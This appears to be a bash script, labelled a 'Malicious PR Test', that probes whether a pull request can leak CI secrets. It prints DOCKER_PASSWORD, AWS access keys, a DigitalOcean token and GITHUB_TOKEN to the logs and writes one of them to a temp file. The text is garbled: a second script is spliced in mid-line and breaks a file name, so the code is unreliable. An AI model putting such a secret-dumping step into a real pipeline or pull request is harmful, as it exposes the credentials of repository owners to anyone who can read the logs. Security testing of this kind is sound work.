#!/bin/bash

echo "=== Malicious PR Test ==="
echo "Printing secret environment variable DOCKER_PASSWORD (masked in logs):"
echo "$DOCKER_PASSWORD"

# Simulate exfiltration (this only prints, does NOT send secrets externally)
echo "Simulating sending secret to attacker server..."
echo "$DOCKER_PASSWORD" > /tmp/leaked_secret.txt
cat /tmp/leaked_secret.tx#!/bin/bash

echo "----- TEST: Exposing Secrets -----"
echo "DOCKER_PASSWORD = $DOCKER_PASSWORD"
echo "AWS_ACCESS_KEY_ID = $AWS_ACCESS_KEY_ID"
echo "AWS_SECRET_ACCESS_KEY = $AWS_SECRET_ACCESS_KEY"
echo "DO_ACCESS_TOKEN = $DO_ACCESS_TOKEN"
echo "GITHUB_TOKEN = $GITHUB_TOKEN"
echo "----------------------------------"t
